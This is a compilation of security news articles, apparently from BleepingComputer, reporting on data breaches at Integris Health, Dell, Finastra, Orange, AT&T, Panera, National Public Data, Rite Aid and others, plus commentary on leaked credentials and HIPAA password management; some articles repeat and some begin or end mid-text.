Unless Integris Health met the attacker's demands, the stolen data would be sold to other cybercriminals on January 5, 2024. The threat actor told BleepingComputer that their attack did not involve encryption and they only stole the data. This did not cause any network interruption and allowed Integris Health to keep providing its services to patients. The emails the patients received from the threat actor contained accurate information and linked to a website in the Tor network hosting the stolen details, but access was not free. Visitors could pay $50 and trust the attacker's word on removing the details, or pay $3 to view information belonging to any other impacted individual. Integris published last week a notification confirming that the incident impacted patient data, which included the following details: The organization clarified that the leaked data did not involve employment information, driver's licenses, account credentials (usernames and passwords), or financial information. Talking to BleepingComputer, the threat actor said that they are selling on a dark web marketplace data for 2.3 million Integris patients (based on the number of social security numbers in the database). In a new entry today, the U.S. Department of HHS Office for Civil Rights (OCR) portal shows that the number of impacted Integris Health patients is 2,385,646 . Integris Health says all affected patients will receive individual notifications, and recipients should remain vigilant to spot and report identity theft and fraud attempts early. The organization has published a FAQ in the form of a PDF where victims can find some additional information regarding the incident, how it impacts them, and what protective steps they can take. It is worth noting that the deadline the threat actor set for Integris Health to pay a ransom has long passed and it is very likely that the stolen data has been sold or share with other cybercriminals, who could use it for various scams, phishing, or other types of attacks.

The computer maker began emailing data breach notifications to customers yesterday, stating that a Dell portal containing customer information related to purchases was breached. ""We are currently investigating an incident involving a Dell portal, which contains a database with limited types of customer information related to purchases from Dell,"" reads a Dell data breach notification shared with BleepingComputer. ""We believe there is not a significant risk to our customers given the type of information involved."" Dell states that the following information was accessed by the threat actor during the breach: The company stresses that the stolen information does not include financial or payment information, email addresses, or telephone numbers and that they are working with law enforcement and a third-party forensics firm to investigate the incident. BleepingComputer contacted Dell on Wednesday to learn more about the breach and how many people it impacted but was told they ""are not disclosing this specific information from our ongoing investigation."" As first reported by Daily Dark Web , a threat actor named Menelik attempted to sell a Dell database on the Breach Forums hacking forum on April 28th. The threat actor said they stole data from the computer maker for ""49 million customer and other information systems purchased from Dell between 2017-2024."" While BleepingComputer has not been able to confirm if this is the same data that Dell disclosed, it matches the information listed in the data breach notification. The Breach Forum's post has since been deleted from the site, which could indicate that another threat actor purchased the database. Dell does not ""believe there is significant risk to our customers given the type of information involved,"" yet the stolen information could potentially be used in targeted attacks against Dell customers. As the stolen information does not include email addresses, threat actors could target specific people with physical mailings with phishing links or that contain media (DVDs/thumb drives) to install malware on targets' devices. While this may sound far-fetched, threat actors have conducted similar attacks in the past, physically mailing tampered Ledger hardware wallets that stole cryptocurrency or sending gifts with USB drives that installed malware . As the database is no longer being sold, there is a good chance a threat actor is attempting to monetize it in some way through attacks. Therefore, be wary of any physical mailings or emails you receive that claim to be from Dell asking you to install software, change passwords, or perform some other potentially risky action. If you receive an email or physical mailing, you should instead contact Dell directly to confirm it is legitimate. It's budget season!

London-based Finastra provides financial services software applications to more than 8,100 financial institutions across 130 countries, including 45 of the world's top 50 banks. As the company warned in breach notification letters sent to those impacted by the breach, the security incident was first detected on November 7 after Finastra identified malicious activity on some of its systems. ""Our investigation revealed that an unauthorized third party accessed a Secure File Transfer Platform (SFTP) at various times between October 31, 2024 and November 8, 2024. Findings from the investigation indicate that on October 31, 2024, the unauthorized third party obtained certain files from the SFTP,"" the fintech giant said. ""Finastra has no indication the unauthorized third party further copied, retained, or shared any of the data. We have no reason to suspect your information has or will be misused. As a result, we believe the risk to individuals whose personal data was involved is low."" While Finastra has yet to share the number of individuals affected by the data breach and the nature of the exposed data (besides victims' names), the company started sending breach notification letters last week to at least 65 people in the state whose financial account information was stolen (according to filings with the Attorney General's office in Massachusetts). The financial services company also provides two years of free credit monitoring and identity restoration services through Experian to those whose information was exposed or stolen in the attack. Although Finastra disclosed very limited information in filings with Attorney General offices, the breach is believed to be linked to a (now-deleted) post made by a threat actor known as ""abyss0"" on the BreachForums online cybercrime community claiming to sell 400GB of data allegedly stolen from Finastra's network . ​When BleepingComputer asked about the forum post in November, a Finastra spokesperson would neither confirm nor deny if the data belonged to the company, only saying that they had suffered a limited-scope security breach and were evaluating its impact. ""On November 7, 2024 Finastra's Security Operations Center (SOC) detected suspicious activity related to an internally hosted Secure File Transfer Platform (SFTP) we use to send files to certain customers,"" Finastra told BleepingComputer. Finastra was also forced to take some of its systems offline in March 2020 to contain what Tom Kilroy, the company's Chief Operating Officer at the time, described as a ransomware attack. While the company didn't share how the attackers gained access to its systems, cyber threat intelligence firm Bad Packets found that Finastra had multiple Pulse Secure VPN and Citrix ADC (NetScaler) unpatched servers before the attack.

The threat actor published on a hacker forum details about the stolen data after trying to extort the company unsuccessfully. Orange confirmed the breach to BleepingComputer saying that it occurred on a non-critical application. The company intiated an investigation and is working to minimize the impact of the incident. According to the threat actor, who uses the alias Rey and is a member of the HellCat ransomware group, the stolen data is mostly from the Romanian branch of the company and includes 380,000 unique email addresses, source code, invoices, contracts, customer and employee information. Rey told BleepingComputer that the breach was not a HellCat ransomware operation and that they had access to Orange’s systems for over a month. On Sunday morning, they started exfiltrating company data and the activity ran for about three hours without the company detecting it. Some samples shared with BleepingComputer show email addresses from former and current Orange Romania employees, partners, and contractors, along with partial details for payment cards belonging to Romanian customers. Some of the data we verfied was quite old. For instance, some of the email addresses were used by individuals that had worked or collaborated with Orange Romania more than five years ago. In the sample with partial payment card information, we found many instances where the data had expired. The leak also contains email addresses and names of Yoxo customers, Orange's subscription service with no contract period. Rey says that they stole almost 12,000 files totaling close to 6.5GB after compromising Orange’s systems by exploiting compromised credentials, and vulnerabilities in the company’s Jira software for bug/issue tracking, and internal portals. The threat actor told us they dropped a ransom note on the compromised system but Orange did not initiate negotiations. BleepingComputer reached out to both Orange Group and Orange Romania with a request for comment and the company said they were looking into the matter. A joint statement was shared and an Orange spokesperson told us that they've been discussing internally on the incident and the steps to mitigate it. ""Orange can confirm that our operations in Romania have been the target of a cyberattack,"" a company representative told BleepingComputer. ""We took immediate action, and our top priority remains protecting the data and interests of our employees, customers and partners. There has been no impact on customers’ operations, and the breach was found to occur on a non-critical back office application"" - Orange The company representative said their ""cybersecurity and IT teams are working hard to assess the extent of the breach and minimize the impact of this incident."" “We are committed to providing regular updates. Additionally, we are committed to complying with all legal obligations associated with such incidents and we are cooperating with the relevant authorities to address this matter,” reads the rest of the statement. Rey told us they breached Orange independently but they are part of the HellCat ransomware group, which has claimed attacks on Schneider Electric and Spanish telecommunications company Telefónica .

AT&T faces lawsuits over data breach affecting 73 million customers,https://www.bleepingcomputer.com/news/security/atandt-faces-lawsuits-over-data-breach-affecting-73-million-customers/#comments,Bill Toulas,"April 3, 2024","AT&T is facing multiple class-action lawsuits following the company's admission to a massive data breach that exposed the sensitive data of 73 million current and former customers. Among the ten lawsuits filed since Saturday, when AT&T confirmed our previous reporting about the breach, one is handled by Morgan & Morgan, representing plaintiff Patricia Dean and similarly situated persons. This law firm recently handled an Incognito privacy lawsuit against Google, pushing the tech giant into a settlement after four years of fighting in the courts. The lawsuit alleges that AT&T failed to adequately protect customers' personal data, leading to a cyberattack and subsequent data breach that exposed sensitive information for 73 million people. The exposed data includes AT&T customers' names, addresses, phone numbers, dates of birth, Social Security Numbers, and email addresses. The class action lawsuit concerns a data breach first published in 2021 by threat actor Shiny Hunters, who claimed at the time to have hacked AT&T and attempted to sell the data. However, AT&T disputed those allegations , saying the leaked data samples didn't belong to them. On March 17, 2024, another threat actor named 'MajorNelson' leaked the entire database on a hacking forum for free, clarifying that it was the same one from Shiny Hunters' attack. Again, AT&T told BleepingComputer that the leaked data did not appear to originate from them and that there were no signs that its systems had been breached. Following an internal investigation, the telecom giant eventually admitted on March 30, 2024, that the exposed data belongs to 7.6 million current AT&T account holders and approximately 65.4 million former account holders. The company also said that the AT&T passcodes for 7.6 million customers were exposed in the leak. When configured, these passcodes are required to receive customer support or perform sensitive account changes. However, exposing this data to threat actors could have allowed attackers to gain access to accounts more easily. AT&T also said they believe the leaked data is from 2019 and earlier but could not determine whether it came from its systems or a partner. The firm's initial and subsequent denials about the origin and authenticity of the leaked data and its failure to determine the origin through timely investigations have exposed customers to a heightened risk of scams and phishing attacks for nearly three years, if not longer. Dean's complaint asserts that AT&T's inadequate security measures and failure to provide timely, adequate notice about the data breach exposed customers to substantial risks, including identity theft and various forms of fraud. The lawsuit accuses AT&T of negligence, breach of implied contract, and unjust enrichment. It seeks compensatory damages, restitution, injunctive relief, improvements to AT&T's data security protocols, future audits, credit monitoring services funded by the company, and a trial by jury. A Morgan & Morgan spokesperson sent BleepingComputer the following comment regarding the litigation: As the largest telecommunications company in the country, AT&T has a crucial duty to safeguard their current and former customers’ sensitive information. We allege AT&T knew about the vulnerability that allegedly led to this breach, but allowed it to occur by failing to act. We’re also alleging AT&T exacerbated the problem by failing to acknowledge the breach had occurred until March 30 of this year, allowing customers’ personal data to linger in criminal hands without their knowledge for more than two-and-a-half years. We will fight to hold AT&T accountable for their alleged actions and inactions that allowed this to happen, and secure justice for all 73 million Americans impacted by this attack on their privacy. - Morgan & Morgan spokesperson BleepingComputer has contacted AT&T for a statement on the above, but we are still awaiting a response. Similar class-action lawsuits submitted against AT&T in the last few days include those of plaintiffs Williamson , Escano , Collier , and Cumo . However, these will likely be consolidated in the future.

"Credentials are Still King: Leaked Credentials, Data Breaches and Dark Web Markets",https://www.bleepingcomputer.com/news/security/credentials-are-still-king-leaked-credentials-data-breaches-and-dark-web-markets/#comment_form,Home,"January 18, 2024","Infostealer malware is one of the most substantial and underappreciated risk vectors for corporate information security teams. Infostealers infect computers, steal all of the credentials saved in the browser along with active session cookies and other data, then export it back to command and control (C2) infrastructure before, in some cases, self-terminating. This article will explore the ways in which threat actors utilize credentials to break into privileged IT infrastructure to create data breaches and distribute ransomware. Infostealers aren’t the only credential threat however. Leaked credentials from traditional sources are still a prominent and substantial risk to organizations. It comes as no surprise that most users reuse passwords across dozens of applications, creating a perfect opportunity for threat actors to brute force their way into SaaS and on-premise applications. At Flare we currently monitor more than forty million stealer logs , a number that is growing by millions every month and looks set to increase even more rapidly in 2024. In addition, we monitor more than 14 billion leaked credentials found from dumps across the dark web. This gives us a unique perspective into how threat actors are acquiring, distributing, and using leaked credentials. To better understand leaked credentials it is helpful to “tier” them into categories based on the method in which they are leaked, and the risk that they pose to the organization. Jason Haddix pioneered this approach to enable security professionals to clearly communicate the risks associated with credential leaks in an easy and consumable way for managers and corporate executives. Tier 1 leaked credentials result from a third-party application/service breaches, and all of the users of that service having their passwords compromised and distributed in a data dump on the dark web. This is what most people think of when they talk about “leaked credentials.” As an example, let’s say the fictional corporation Scatterholt has user logins with hundreds of thousands of consumer logins. Attackers breach Scatterholt and access the identity and access management system, then they steal these credentials and leak them onto the dark web. It’s easy enough for Scatterholt corporation to force a password reset across all users, but chances are these users have reused the same password across many services. This leak allows threat actors to use brute forcing/pentesting tools to attempt to brute force credentials for thousands of users on other applications that they may have used the same password for. There are numerous well-researched defenses that organizations can use to reduce risk. First and most importantly: monitor a leaked credentials database for corporate employee emails. This alone can make a massive difference as threat actors deliberately seek out passwords associated with corporate email addresses to facilitate data breaches. Secondly, require users to routinely reset passwords on a time-schedule so that if a specific password is breached, they will have already rotated other corporate credentials. Finally, we recommend employing a password manager with a policy that requires employees to randomize passwords to various applications and store them with the manager, reducing the risk that employees will only make small changes to passwords. Combolists are typically composed of credential pairs that are either organized by service, or geographically, which are then used by cybercriminals in combination with Brute Forcing tools to attempt to gain access to various services. These credentials usually come from previous known breaches, or stealer logs, or sometimes totally made up; the original source is never totally clear, but the sheer amount of credentials one can acquire through combolists combined with frequent password reuse on the user’s part still makes them a considerable attack vector. Tier 2 leaked credentials pose a special degree of risk to companies. These are credentials harvested directly from the user through infostealer malware that steals all passwords saved in the browser. We consider tier 2 leaked credentials to be of significantly increased risk to both the company and the user for the following reasons: This tier of leaks is also from stealer logs, but pose extreme risk to the organization. Fresh stealer logs often have active session cookies in them which can be easily used by actors for session hijacking attacks in which they impersonate the victim and potentially bypass 2FA and MFA controls. Finding a fresh stealer log being distributed with corporate credentials should immediately prompt an incident investigation, as it is highly likely that the passwords are working and that actors could directly access corporate resources. Where possible limit TTL for corporate applications to reduce the risk of session cookies still being valid if distributed as a result of an infostealer infection. If you aren’t monitoring for leaked credentials and you likely have single-factor authentication for many of your employees since many of them will have exposed passwords. Many people are under the impression that having two-factor authentication enabled is protection enough from stolen credentials, but the reality, as we’ve witnessed many times over, is that threat actors are very conscious of the barrier 2FA imposes and have techniques and strategies to get over the hurdle. Whether through social engineering of employees, or using 2FA bots to capture the one-time code/password from their victims, or even SIM-swapping, there is a surprising amount of ways to bypass multi-factor authentication controls that are actively used in the wild. The best defense against those types of attacks feature the use of authenticator apps, which feature temporary rotating codes rather than the one-time passwords users may get via email or SMS, as these applications are usually much more secure, and to a certain extent ensure the user in question has control of (usually) a second device.

Panera warns of employee data breach after March ransomware attack,https://www.bleepingcomputer.com/news/security/panera-warns-of-employee-data-breach-after-march-ransomware-attack/#comment_form,Sergiu Gatlan,"June 13, 2024","U.S. food chain giant Panera Bread is notifying employees of a data breach after unknown threat actors stole their sensitive personal information in a March ransomware attack. The company and its franchises own 2,160 cafes under the names Panera Bread or Saint Louis Bread Co, spread across 48 states in the U.S. and Ontario, Canada. In breach notification letters filed with the Office of California's Attorney General, Panera said it detected what it describes as a ""security incident,"" took measures to contain the breach, hired external cybersecurity experts to investigate the incident, and notified law enforcement. ""The files involved were reviewed, and on May 16, 2024, we determined that a file contained your name and Social Security number,"" the company said [ PDF ]. ""Other information you provided in connection with your employment could have been in the files involved. As of the date of mailing of this letter, there is no indication that the information accessed has been made publicly available."" Panera says it will provide those affected by this data breach with a one-year membership to CyEx's Identity Defense Total, which includes credit monitoring, identity detection, and identity theft resolution. The company has yet to publicly disclose the number of employees impacted, the threat actor behind the attack, and the nature of the incident. While the food giant has yet to confirm this publicly, BleepingComputer reported in early April that many of Panera's virtual machine systems were encrypted in a ransomware attack. As a result of this breach, Panera suffered a massive outage that affected its internal IT systems, phones, point of sales system, website, and mobile apps. During this widespread system outage, employees could not access their shift details and had to contact their managers to learn work schedules. Stores were also unable to process electronic payments and had to accept cash only, while reward program systems were down, preventing members from redeeming their points. ​However, it's unclear which ransomware operation was behind the March breach, as none have claimed responsibility. This implies that the threat actors are either waiting for a ransom payment or have already received it.

Panera warns of employee data breach after March ransomware attack,https://www.bleepingcomputer.com/news/security/panera-warns-of-employee-data-breach-after-march-ransomware-attack/,Sergiu Gatlan,"June 13, 2024","U.S. food chain giant Panera Bread is notifying employees of a data breach after unknown threat actors stole their sensitive personal information in a March ransomware attack. The company and its franchises own 2,160 cafes under the names Panera Bread or Saint Louis Bread Co, spread across 48 states in the U.S. and Ontario, Canada. In breach notification letters filed with the Office of California's Attorney General, Panera said it detected what it describes as a ""security incident,"" took measures to contain the breach, hired external cybersecurity experts to investigate the incident, and notified law enforcement. ""The files involved were reviewed, and on May 16, 2024, we determined that a file contained your name and Social Security number,"" the company said [ PDF ]. ""Other information you provided in connection with your employment could have been in the files involved. As of the date of mailing of this letter, there is no indication that the information accessed has been made publicly available."" Panera says it will provide those affected by this data breach with a one-year membership to CyEx's Identity Defense Total, which includes credit monitoring, identity detection, and identity theft resolution. The company has yet to publicly disclose the number of employees impacted, the threat actor behind the attack, and the nature of the incident. While the food giant has yet to confirm this publicly, BleepingComputer reported in early April that many of Panera's virtual machine systems were encrypted in a ransomware attack. As a result of this breach, Panera suffered a massive outage that affected its internal IT systems, phones, point of sales system, website, and mobile apps. During this widespread system outage, employees could not access their shift details and had to contact their managers to learn work schedules. Stores were also unable to process electronic payments and had to accept cash only, while reward program systems were down, preventing members from redeeming their points. ​However, it's unclear which ransomware operation was behind the March breach, as none have claimed responsibility. This implies that the threat actors are either waiting for a ransom payment or have already received it.

National Public Data confirms breach exposing Social Security numbers,https://www.bleepingcomputer.com/news/security/national-public-data-confirms-breach-exposing-social-security-numbers/,Ionut Ilascu,"August 16, 2024","Background check service National Public Data confirms that hackers breached its systems after threat actors leaked a stolen database with millions of social security numbers and other sensitive personal information. The company states that the breached data may include names, email addresses, phone numbers, social security numbers (SSNs), and postal addresses. In the statement disclosing the security incident, National Public Data says that “the information that was suspected of being breached contained name, email address, phone number, social security number, and mailing address(es).” The company acknowledges the “leaks of certain data in April 2024 and summer 2024” and believes the breach is associated with a threat actor “that was trying to hack into data in late December 2023.” NPD says they investigated the incident, cooperated with law enforcement, and reviewed the potentially affected records. If significant developments occur, the company “will try to notify” the impacted individuals. It is worth noting that BleepingComputer’s testing revealed that access to NPD’s statement on the security incident has been blocked for IP addresses in numerous locations in the U.S. as well as regions outside the country. More than a dozen captures of the page exist on the Internet Archive, though. Although a large portion of the database stolen from National Public Data (NPD) was leaked 10 days ago, partial copies had previously been shared by various threat actors. The leaks started after a threat actor in April using the alias USDoD offered to sell for $3.5 million 2.9 billion records allegedly stolen from NPD. Earlier this month, another threat actor known as Fenice shared for free the most comprehensive variant of the database with 2.7 billion records, with multiple records referring to a single person. It is unclear how many individuals are impacted but multiple people confirmed to BleepingComputer that the records included details about them as well as their family members, including deceased ones. According to Troy Hunt, the creator and maintainer of the Have I Been Pwned ( HIBP ) search service for compromised personal data, there were 134 million unique email addresses in one version of the NPD leaked database he analyzed. Not all the information may be accurate, though. Tests from BleepingComputer showed that some people were associated with someone else’s name. Hunt’s analysis of the dataset he received seems to confirm this, as he found one of his email addresses associated with two unique dates of birth, none of them his. Furthermore, BleepingComputer found that some of the details in the database may also be outdated, as it does not include the current address of any of the people we checked. Inaccuracies aside, the NPD incident has led to at least one class action lawsuit against Jerico Pictures , the entity that operates the National Public Data service. NPD is believed to source their details from public files such as government records (federal, state, and local), which include all legal papers related to an individual. People impacted by the NPD breach should monitor financial accounts for signs of potentially fraudulent activity and report it to credit bureaus. Because contact information is present in the leak, there is also the possibility of phishing attempts to trick you into providing more sensitive details that could be used for fraudulent activities.

The pharmacy giant employs over 6,000 pharmacists (out of a total workforce of more than 45,000) in 1,700 retail stores across 16 states. In data breach notification letters filed with the Office of Maine's Attorney General, Rite Aid said it detected the incident on June 6, 12 hours after the attackers breached its network using an employee's credentials. ""We determined by June 17, 2024, that certain data associated with the purchase or attempted purchase of specific retail products was acquired by the unknown third party,"" the company said. ""This data included purchaser name, address, date of birth and driver’s license number or other form of government-issued ID presented at the time of a purchase between June 6, 2017, and July 30, 2018."" Just as it told BleepingComputer when it first confirmed the data breach on Friday, Rote Aid added that the customers' Social Security numbers, financial information, or health information were not exposed in the incident. Although Rite Aid has yet to reveal who was behind the June attack, the RansomHub ransomware gang claimed the breach, saying they also stole customer data from the company's systems. ​""While having access to the Riteaid network we obtained over 10 GB of customer information equating to around 45 million lines of people's personal information. This information includes name, address, dl_id number, dob, riteaid rewards number,"" RansomHub said on their dark web leak site. The drugstore chain was added to RansomHub's leak site after it allegedly halted ransom negotiations, which prompted the ransomware gang to share a screenshot of claimed stolen data as proof, stating that everything would be leaked in two weeks. Rite Aid has yet to reply to a request for more details regarding the June incident after BleepingComputer reached out again on Friday. RansomHub is a relatively new operation that extorts victims in exchange for not leaking stolen files. If negotiations fail, the files are often auctioned to the highest bidder. The gang focuses on data-theft-based extortion rather than encrypting victims' files, although they were identified as a potential buyer of Knight ransomware source code . Since the start of the year, RansomHub has also claimed responsibility for breaching U.S. telecom provider Frontier Communications, stealing the information of 750,000 customers and forcing them to shut down systems to contain the breach.

Rite Aid says June data breach impacts 2.2 million people,https://www.bleepingcomputer.com/news/security/rite-aid-says-june-data-breach-impacts-22-million-people/#comment_form,Sergiu Gatlan,"July 16, 2024","Rite Aid, the third-largest drugstore chain in the United States, says that 2.2 million customers' personal information was stolen last month in what it described as a ""data security incident."" The pharmacy giant employs over 6,000 pharmacists (out of a total workforce of more than 45,000) in 1,700 retail stores across 16 states. In data breach notification letters filed with the Office of Maine's Attorney General, Rite Aid said it detected the incident on June 6, 12 hours after the attackers breached its network using an employee's credentials. ""We determined by June 17, 2024, that certain data associated with the purchase or attempted purchase of specific retail products was acquired by the unknown third party,"" the company said. ""This data included purchaser name, address, date of birth and driver’s license number or other form of government-issued ID presented at the time of a purchase between June 6, 2017, and July 30, 2018."" Just as it told BleepingComputer when it first confirmed the data breach on Friday, Rote Aid added that the customers' Social Security numbers, financial information, or health information were not exposed in the incident. Although Rite Aid has yet to reveal who was behind the June attack, the RansomHub ransomware gang claimed the breach, saying they also stole customer data from the company's systems. ​""While having access to the Riteaid network we obtained over 10 GB of customer information equating to around 45 million lines of people's personal information. This information includes name, address, dl_id number, dob, riteaid rewards number,"" RansomHub said on their dark web leak site. The drugstore chain was added to RansomHub's leak site after it allegedly halted ransom negotiations, which prompted the ransomware gang to share a screenshot of claimed stolen data as proof, stating that everything would be leaked in two weeks. Rite Aid has yet to reply to a request for more details regarding the June incident after BleepingComputer reached out again on Friday. RansomHub is a relatively new operation that extorts victims in exchange for not leaking stolen files. If negotiations fail, the files are often auctioned to the highest bidder. The gang focuses on data-theft-based extortion rather than encrypting victims' files, although they were identified as a potential buyer of Knight ransomware source code . Since the start of the year, RansomHub has also claimed responsibility for breaching U.S. telecom provider Frontier Communications, stealing the information of 750,000 customers and forcing them to shut down systems to contain the breach.

Regulation S-P was introduced in 2000 and controls how some financial entities must treat nonpublic personal information belonging to consumers. These rules include developing and implementing data protection policies, confidentiality and security assurances, and protecting against anticipated threats. The new amendments adopted earlier this week impact financial firms, such as broker-dealers (funding portals included), investment firms, registered investment advisers, and transfer agents. The modifications were initially proposed in March of last year to modernize and improve the protection of individual financial information from data breaches and exposure to non-affiliated parties. Below is a summary of the introduced changes: The modifications represent an important update to a rule initially adopted in 2000 that could no longer adequately protect customers' financial data privacy in today's cybersecurity landscape. ""Over the last 24 years, the nature, scale, and impact of data breaches has transformed substantially,"" said SEC Chair Gary Gensler. ""These amendments to Regulation S-P will make critical updates to a rule first adopted in 2000 and help protect the privacy of customers' financial data."" ""The basic idea for covered firms is if you've got a breach, then you've got to notify. That's good for investors."" The amendments take effect 60 days after publication in the Federal Register, the official journal of the U.S. federal government, including agency rules, proposed rules, and public notices. Larger organizations have a compliance date of 18 months after the modifications are published in the Federal Register . For smaller entities, the period extends to two years. In December, the SEC also introduced new rules requiring all public companies to disclose that they suffered a breach if it materially affected or is reasonably likely to materially affect business strategy, results of operations, or financial condition.

Nansen is a popular entity in the cryptocurrency space, offering users insights into Ethereum wallet activity, helping identify emerging projects, and generally helping people make informed investment decisions. In a letter sent to impacted users, Nansen says they learned on September 20t that one of their third-party vendors suffered a data breach. The unnamed vendor was compromised by an attacker who somehow gained access to an admin panel controlling Nansen customer access on the analytics platform. Nansen stopped the malicious activity shortly after the vendor informed them about the incident, but the ensuing investigation confirmed that user data was compromised. ""Based on our preliminary investigations over the past 48 hours, 6.8% of our users were impacted,"" reads Nansen's notice shared on Twitter. ""These users had their email addresses exposed, a smaller portion also had password hashes exposed, and a last, smallest group also had their blockchain address exposed."" If you have any information on the breached provider other attacks, you can contact BleepignComputer confidentially via Signal at 646-961-3731 or on Telegram at @lableep. All impacted users have been informed about the breach via email notifications, while Nansen's support has also contacted them to request a password resetting action. Nansen says the passwords were encrypted but advises impacted individuals to change passwords, as brute-forcing is always a plausible scenario. The firm emphasizes the heightened phishing risk for individuals whose details are exposed. Threat actors, now armed with knowledge of digital asset ownership and their email addresses, can target them more effectively. As the investigation hasn't been completed yet, it is not unlikely that the scope of the impact will be revised to include more users.

In a new statement, Penn confirmed BleepingComputer's reporting that the hackers breached its systems using compromised credentials, stating they were stolen in a social engineering attack. ""On October 31, Penn discovered that a select group of information systems related to Penn's development and alumni activities had been compromised,"" reads a new Penn statement. ""Penn employs a robust information security program; however, access to these systems occurred due to a sophisticated identity impersonation commonly known as social engineering."" ""Penn's staff rapidly locked down the systems and prevented further unauthorized access; however, not before an offensive and fraudulent email was sent to our community and information was taken by the attacker. Penn is still investigating the nature of the information that was obtained during this time."" The University of Pennsylvania says it has notified the FBI of the breach and is working with CrowdStrike to investigate the security incident. As first reported by BleepingComputer, the threat actor breached Penn's systems on October 30 using an employee's PennKey SSO account that provided access to the university's Salesforce instance, Qlik analytics platform, SAP business intelligence system, and SharePoint files. Using this access, the threat actors stole 1.71 GB of internal documents from the university's SharePoint and Box storage platforms, including spreadsheets, documents, financial information, and alumni marketing materials. The hackers also told BleepingComputer that they stole Penn's Salesforce donor marketing database, containing 1.2 million records with a wide variety of donor information. A sample of this data includes 158 distinct fields, which contain the following sensitive information: After discovering their access had been revoked, the hacker said they still had access to Penn's Salesforce Marketing Cloud account and used it to send an offensive mass email to 700,000 recipients. In a post on a hacking forum, the attackers say they are not currently leaking the data records but may do so in a month or two. While the hackers claimed the attack wasn't politically motivated and said their goal was Penn's ""vast, wonderfully wealthy donor database,"" both their emails and a post on a hacking forum were laced with sharp criticism of the university's alleged DEI practices, admissions policies, and ""love of nepobabies."" The University of Pennsylvania says it is taking steps to increase security on its systems, including employee training on social engineering attacks and enhanced monitoring and security measures. After the investigation is complete, Penn says it will notify those affected by the data breach.

The data breach notification warns of a security incident that impacted Rightway Healthcare, which provides healthcare coverage for Okta employees and their families. On September 23, 2023, Rightway suffered a network breach, resulting in cybercriminals accessing an eligibility census file maintained for insurance provision and benefit plans for eligible individuals. The file contained the following information on current and former Okta employees and their dependents: Okta learned about the breach on October 12, 2023, when Rightway disclosed the attack, and immediately launched an investigation to determine the extent of the compromise. According to Okta's report to the Office of the Maine Attorney General, the breach impacted a total of 4,961 employees. Apart from the exposure of health information, the leak of employees' full names could be helpful to cybercriminals in deriving corporate email addresses and engaging in targeted brute-forcing to hijack valuable accounts within the company. The notice highlights twice that Okta has no evidence the personal information of those people has been misused. However, the firm encloses instructions on enrolling for two-year credit monitoring, identity theft protection, and fraud protection services through Experian.

On October 20, 2023, Okta warned that attackers accessed files containing cookies and session tokens uploaded by customers to its support management system after breaching it using stolen credentials. This exposure impacted customers of Okta, including BeyondTrust, Cloudflare, the 1Password password manager, and possibly many more.

Finastra is a financial software company serving over 8,000 institutions across 130 countries, including 45 of the world's top 50 banks and credit unions. The company employs 12,000 people, and last year, it reported a revenue of $1.7 billion. The security incident occurred on November 7, 2024, when an attacker used compromised credentials to access one of Finastra's Secure File Transfer Platform (SFTP) systems. The firm says that its investigation so far, which is aided by external cybersecurity experts, shows no evidence that the breach extended beyond its SFTP platform. The firm's software services include lending solutions, payment processing, cloud-enabled retail and banking platforms, and trading risk management tools. Brian Krebs first reported that Finastra suffered a security breach yesterday after seeing a data breach notification sent to an impacted person. The attack is believed to be linked to a recent post on a hacking forum, where a threat actor named ""abyss0"" claimed to be selling 400GB of data stolen from Finastra. When asked about the forum post, a Finastra spokesperson would neither confirm nor deny if the data belonged to them, only telling BleepingComputer that they had suffered a limited-scope security breach and are currently evaluating its impact. ""On November 7, 2024 Finastra's Security Operations Center (SOC) detected suspicious activity related to an internally hosted Secure File Transfer Platform (SFTP) we use to send files to certain customers,"" Finastra told BleepingComputer. ""We immediately launched an investigation alongside of a third-party cybersecurity firm and, as a precautionary step, isolated and contained the platform. This incident was limited to the one platform and there was no lateral movement beyond it."" The company also clarified that the compromised SFTP platform was not used by all its customers, nor was it the default platform used by Finastra for file exchange. However, the exact impact and scope of its breach are still being investigated, and determining who is impacted may take a while until it's completed. Those who are deemed impacted will be contacted directly, so public disclosures from Finastra are not expected. It's worth noting that the threat actor who published the data samples earlier this month has since deleted the post, so whether the data was sold to a buyer or 'abyss0' became concerned by the sudden publicity is unknown. In March 2020, Finastra suffered another major cybersecurity incident when it got hit by ransomware actors . Back then, the fintech company was forced to take parts of its IT infrastructure offline in response to the threat, which caused service disruptions. Though the means of initial access was unknown, reports from threat monitoring platforms highlighted the firm's lackluster vulnerability management strategy, noting that it was using older versions of Pulse Secure VPN and Citrix servers.

These statistics reflect a fundamental threat to patient and organizational safety. Current implications extend far beyond financial penalties or reputational damage. A breach of electronic Protected Health Information (ePHI) can disrupt patient care, compromise safety, and undermine trust in the whole healthcare system. “Since 2020, as reported by HHS Office of Civil Rights, 590 million medical records have been impacted by health care breaches, meaning that the entirety of the U.S. population has had their health care records compromised in some manner, with most being impacted more than once.” — American Hospital Association This reality has transformed password management from a routine IT function into a mission-critical component of healthcare delivery. The Health Insurance Portability and Accountability Act (HIPAA) sets specific requirements for password management that healthcare organizations must address through comprehensive policies and technical safeguards. Yet, the regulation leaves many security leaders struggling to translate broad requirements into actionable implementation strategies. HIPAA, introduced in 1996, is a U.S. federal law that sets strict rules for protecting sensitive patient health information from unauthorized disclosure. While it is often associated with privacy protections, HIPAA also includes the Security Rule, which specifically addresses the safeguarding of electronic Protected Health Information. ePHI refers to any personally identifiable health information that is created, stored, transmitted, or received electronically by a covered entity or business associate. “The role of the CISO in healthcare is very unique. I believe that information security is a patient safety issue. And I think a lot of organizations are just starting to think about it as not just a risk to a patient's information but a risk to a patient's life. Bad information in a medical record could actually kill someone. I see the role of the CISO as integral to the delivery of quality patient care.” — Anahi Santiago , CISO at Christiana Care Health System HIPAA applies to two primary categories of entities: Covered entities . Organizations like hospitals, clinics, doctors, insurance companies, and other healthcare providers. Business associates. IT providers, cloud storage companies, billing services, and consultants — people or companies that work with covered entities and have access to ePHI. HIPAA violations can result in significant penalties and reputational damage. Since 2003, the HHS Office for Civil Rights has i mposed $144,878,972 in total penalties , with recent 2025 penalties including $3 million against Solara Medical Supplies and $1.5 million against Warby Parker for cybersecurity failures. Beyond financial consequences, organizations face permanent listing on OCR's ""Wall of Shame"" breach portal , potential criminal prosecution (with 2,419 cases referred to the Department of Justice), and severe reputational damage. By understanding HIPAA requirements and choosing a compliant password manager like Passwork, organizations can enhance their defense mechanisms against cyber threats. For healthcare security leaders, the takeaway is clear: prioritizing password management is not optional — it's a critical component of both compliance and patient safety. By investing in the right tools and practices, organizations can protect sensitive data, reduce risks, and build a culture of cybersecurity awareness. The challenge is compounded by the unique operational environment of healthcare organizations. Unlike other 